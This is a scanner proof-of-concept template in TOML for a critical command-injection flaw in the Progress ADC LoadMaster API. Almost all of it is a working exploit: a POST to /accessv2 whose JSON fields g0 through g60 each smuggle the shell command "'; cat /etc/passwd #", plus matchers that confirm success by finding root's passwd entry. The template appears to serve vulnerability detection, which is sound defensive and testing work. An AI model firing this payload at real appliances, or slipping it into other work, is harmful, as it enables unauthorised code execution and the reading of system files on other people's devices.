[info]
author = "ave"
description = "验证 Progress ADC LoadMaster API 命令注入漏洞。通过向 /accessv2 端点发送未过滤的 JSON 请求，检测是否存在命令注入导致的远程代码执行。"
id = "POC-AVE-2026-1279"
name = "Progress ADC LoadMaster Command Injection PoC"
severity = "critical"
tags = ["ave-2026-1279"]
vuln_id = [
    "CVE-2026-8037",
    "AVE-2026-1279",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/accessv2"
protocol = "http"

[poc.requests.body]
content = """{"cmd":"getall","apiuser":"''''","apipass":"BBBBB","g0":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g1":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g2":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g3":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g4":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g5":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g6":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g7":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g8":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g9":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g10":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g11":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g12":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g13":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g14":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g15":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g16":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g17":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g18":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g19":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g20":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g21":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g22":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g23":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g24":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g25":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g26":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g27":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g28":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g29":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g30":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g31":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g32":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g33":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g34":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g35":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g36":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g37":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g38":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g39":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g40":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g41":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g42":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g43":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g44":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g45":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g46":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g47":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g48":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g49":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g50":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g51":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g52":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g53":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g54":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g55":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g56":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g57":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g58":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g59":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #","g60":"AAAAAAAAAAAAAAAA'; cat /etc/passwd #"}"""
type = "json"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:x:0:0:"]

[[poc.requests.matchers]]
expect = true
part = "header"
type = "word"
words = ["application/json"]

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
